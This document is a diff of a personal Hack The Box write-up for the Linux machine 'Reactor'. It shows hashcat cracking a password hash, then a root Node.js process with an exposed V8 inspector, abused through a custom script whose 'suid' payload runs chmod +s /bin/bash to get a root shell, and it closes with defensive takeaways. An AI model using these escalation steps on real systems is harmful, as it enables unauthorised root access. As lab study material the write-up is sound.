@@ -12,14 +12,195 @@ tags:
   - jvm
   - rce
   - sudo
-synced: "2026-10-16 12:38"
+synced: "2026-11-02 09:58"
 ---
 
-# Reactor - Hack The Box Writeup
+--
+tags:
+ciber
+htb
+machine
+difficulty: Easy
+os: Linux
+status: Pwned
+ip: ""
+created: 2026-10-16
+--
+
+<p align="center">
+  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1c58c3b-0931-413d-9394-5fae4350ec4c-1778698333.png" alt="Reactor Avatar" width="220">
+</p>
+
+## Operating System: Linux
+![[Linux.png|70]]
+
+## Machine Metadata
+
+| Property | Value |
+| :--- | :--- |
+| **Machine ID** | 900 |
+| **Machine Name** | Reactor |
+| **IP Address** | N/A |
+| **Status** | Pwned |
+| **Active on HTB** | ✅ |
+| **User Flag** | ✅ |
+| **Root Flag** | ✅ |
+| **Difficulty** | Easy |
+| **Stars** | ⭐️ 4.1 |
+| **Created Note** | 2026-10-16 |
+| **Release Date** | 2026-05-23 |
+| **Tags** | #Enterprise_Network #Vulnerability_Assessment #Person #Weak_Credentials #Remote_Code_Execution #Deserialization #Sensitive_Data_Exposure #Python #JavaScript #SSH #NodeJS #SQLite #Linux #NextJS #Configuration_Analysis #Password_Cracking #Port_Forwarding #Common_Services #Software_&_OS_exploitation #Programming |
+
+<p style="display:none">
+id:: 900
+active:: True
+name:: Reactor
+os:: Linux
+user_flag:: True
+root_flag:: True
+difficulty_text:: Easy
+stars:: 4.1
+created:: 2026-10-16
+published:: 2026-05-23
+avatar:: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1c58c3b-0931-413d-9394-5fae4350ec4c-1778698333.png
+tags:: #Enterprise_Network #Vulnerability_Assessment #Person #Weak_Credentials #Remote_Code_Execution #Deserialization #Sensitive_Data_Exposure #Python #JavaScript #SSH #NodeJS #SQLite #Linux #NextJS #Configuration_Analysis #Password_Cracking #Port_Forwarding #Common_Services #Software_&_OS_exploitation #Programming
+</p>
+
+## Statistics
+
+### Radar Matrix
+```chartsview
+#-----------------#
+#- chart type    -#
+#-----------------#
+type: Radar
+
+#-----------------#
+#- chart data    -#
+#-----------------#
+data:
+item: "ENUM"
+    user: "user"
+    score: 5.1
+item: "REAL"
+    user: "user"
+    score: 5.4
+item: "CVE"
+    user: "user"
+    score: 6.4
+item: "CUSTOM"
+    user: "user"
+    score: 3.6
+item: "CTF"
+    user: "user"
+    score: 4.6
+item: "ENUM"
+    user: "author"
+    score: 0
+item: "REAL"
+    user: "author"
+    score: 0
+item: "CVE"
+    user: "author"
+    score: 0
+item: "CUSTOM"
+    user: "author"
+    score: 0
+item: "CTF"
+    user: "author"
+    score: 0
+
+#-----------------#
+#- chart options -#
+#-----------------#
+options:
+  xField: "item"
+  yField: "score"
+  seriesField: "user"
+  meta:
+    score:
+      alias: "Score"
+      min: 0
+      nice: true
+  xAxis:
+    line: null
+    tickLine: null
+  yAxis:
+    label: false
+    grid:
+      alternateColor: "rgba(0, 0, 0, 0.04)"
+  point: []
+  area: []
+```
+
+### Community Difficulty Rating
+```chartsview
+#-----------------#
+#- chart type    -#
+#-----------------#
+type: Column
+
+#-----------------#
+#- chart data    -#
+#-----------------#
+data:
+folder: "PIECE OF CAKE"
+    count: 1638
+folder: "VERY EASY"
+    count: 2103
+folder: "EASY"
+    count: 5385
+folder: "NOT TOO EASY"
+    count: 2711
+folder: "MEDIUM"
+    count: 1052
+folder: "A BIT HARD"
+    count: 318
+folder: "HARD"
+    count: 233
+folder: "EXTREMELY HARD"
+    count: 73
+folder: "INSANE"
+    count: 26
+folder: "BRAINFUCK"
+    count: 74
+
+#-----------------#
+#- chart options -#
+#-----------------#
+options:
+  xField: "folder"
+  yField: "count"
+  padding: auto
+  label:
+    position: "middle"
+    style:
+      opacity: 0.6
+      fontSize: 12
+  columnStyle:
+    fillOpacity: 0.5
+    lineWidth: 1
+    strokeOpacity: 0.7
+    shadowColor: "grey"
+    shadowBlur: 10
+    shadowOffsetX: 5
+    shadowOffsetY: 5
+  xAxis:
+    label:
+      autoHide: false
+      autoRotate: true
+  meta:
+    count:
+      alias: "Votes"
+```
+
+--
+
+--
 
 ## Reconnaissance
 
-We begin by scanning the target machine (`10.129.55.228`) with `nmap` to discover open ports. 
+We begin by scanning the target machine (`10.129.55.228`) with [[Recon - Nmap - Port Scanning and Host Discovery|Nmap]] to discover open ports. 
 
 ![[Pasted image 20260723143828.png]]
 
@@ -153,7 +334,7 @@ hashcat (v7.1.2) starting
 
 OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
 ====================================================================================================================================================
-* Device #01: cpu-skylake-avx512-AMD Ryzen 9 7945HX with Radeon Graphics, 6971/13943 MB (2048 MB allocatable), 16MCU
+Device #01: cpu-skylake-avx512-AMD Ryzen 9 7945HX with Radeon Graphics, 6971/13943 MB (2048 MB allocatable), 16MCU
 
 Minimum password length supported by kernel: 0
 Maximum password length supported by kernel: 256
@@ -163,12 +344,12 @@ Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
 Rules: 1
 
 Optimizers applied:
-* Zero-Byte
-* Early-Skip
-* Not-Salted
-* Not-Iterated
-* Single-Salt
-* Raw-Hash
+Zero-Byte
+Early-Skip
+Not-Salted
+Not-Iterated
+Single-Salt
+Raw-Hash
 
 ATTENTION! Pure (unoptimized) backend kernels selected.
 Pure kernels can crack longer passwords, but drastically reduce performance.
@@ -181,10 +362,10 @@ Watchdog: Temperature abort trigger disabled.
 Host memory allocated for this attack: 516 MB (14952 MB free)
 
 Dictionary cache hit:
-* Filename..: /usr/share/wordlists/rockyou.txt
-* Passwords.: 14344385
-* Bytes.....: 139921507
-* Keyspace..: 14344385
+Filename..: /usr/share/wordlists/rockyou.txt
+Passwords.: 14344385
+Bytes.....: 139921507
+Keyspace..: 14344385
 
 39d97110eafe2a9a68639812cd271e8e:reactor1
 Approaching final keyspace - workload adjusted.
@@ -236,7 +417,7 @@ engineer@reactor:~$ cat user.txt
 
 ## Privilege Escalation
 
-To identify vectors for privilege escalation, we execute `linpeas.sh` on the system. Looking through the output, we spot a suspicious `node` process running as `root` with the V8 inspector enabled:
+To identify vectors for privilege escalation, we execute `linpeas.sh` on the system. Looking through the output, we spot a suspicious `node` process running as `root` with the V8 inspector enabled (exploited via [[Linux - PrivEsc - Node V8 Inspector|Node.js V8 Inspector Privilege Escalation]]):
 
 ```shell
 ════════════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════════
@@ -251,7 +432,7 @@ root        1391  0.0  1.1 1065756 45292 ?       Ssl  13:28   0:00 /usr/bin/node
 
 The parameter `--inspect=127.0.0.1:9229` opens a debugging port that allows executing arbitrary JavaScript within the Node.js context. Because the process is running as root, any code we run through the inspector also executes as root. 
 
-We utilize a custom exploit script (`node_inspector_lpe.py`) to connect to the inspector's WebSocket. First, we confirm our access by executing the `id` command:
+We utilize a custom exploit script (`node_inspector_lpe.py`) to connect to the inspector's [[Web - Protocols - Unauthenticated WebSocket Terminal|WebSocket]]. First, we confirm our access by executing the `id` command:
 
 ```shell
 engineer@reactor:~$ python3 node_inspector_lpe.py --payload id
@@ -279,7 +460,7 @@ uid=0(root) gid=0(root) groups=0(root)
 [*] Done.
 ```
 
-Next, we run the script with the `suid` payload. This runs `chmod +s /bin/bash`, setting the SUID bit on the bash executable and allowing us to drop into a root shell:
+Next, we run the script with the `suid` payload. This runs `chmod +s /bin/bash`, setting the [[Linux - PrivEsc - SUID|SUID bit]] on the bash executable and allowing us to drop into a root shell:
 
 ```shell
 engineer@reactor:~$ python3 node_inspector_lpe.py --payload suid
@@ -325,3 +506,16 @@ bash-5.2#
 ## Conclusion
 
 Reactor highlights the dangers of using outdated or vulnerable web frameworks (Next.js react2shell) and underscores the importance of securing local development and administrative tools. Exposing the Node.js V8 inspector on a root process created a straightforward path for privilege escalation, demonstrating why debugging interfaces should never be left active or unauthenticated in production environments.
+
+--
+
+## Post-Engagement & Zettelkasten Notes
+
+### Key Takeaways & Defense
+**Node.js V8 Inspector Security**: The V8 debugging inspector (`--inspect`) allows arbitrary JavaScript execution and must never be exposed or run with elevated root privileges.
+**Local WebSocket Access**: Restrict WebSocket communication on administrative localhost ports to authenticated operators only.
+
+### Atomic Notes to Extract
+[[Linux - PrivEsc - Node V8 Inspector|Node.js V8 Inspector Privilege Escalation]]
+[[Web - Protocols - Unauthenticated WebSocket Terminal|WebSocket Exploitation]]
+[[Linux - PrivEsc - SUID|SUID Exploitation]]
